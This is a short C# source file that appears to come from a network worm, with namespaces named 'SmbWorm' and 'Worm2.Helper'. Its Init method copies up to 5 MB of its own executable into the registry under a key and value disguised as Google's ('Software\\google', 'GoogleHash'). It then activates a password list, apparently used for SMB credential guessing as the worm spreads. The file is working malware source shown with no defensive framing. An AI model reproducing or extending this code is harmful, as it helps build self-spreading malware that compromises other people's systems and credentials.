using System;
using System.Diagnostics;
using System.IO;
using Microsoft.Win32;
using SmbWorm;

namespace Worm2.Helper;

internal class Config
{
	public static byte[] Bulid;

	public static void Init()
	{
		string? fileName = Process.GetCurrentProcess().MainModule.FileName;
		int num = 5242880;
		Bulid = File.ReadAllBytes(fileName);
		if (new FileInfo(fileName).Length > num)
		{
			byte[] array = new byte[num];
			Array.Copy(Bulid, array, num);
			Bulid = array;
		}
		using (RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\google"))
		{
			registryKey.SetValue("GoogleHash", Bulid);
		}
		PasswordList.ActivateList();
	}
}
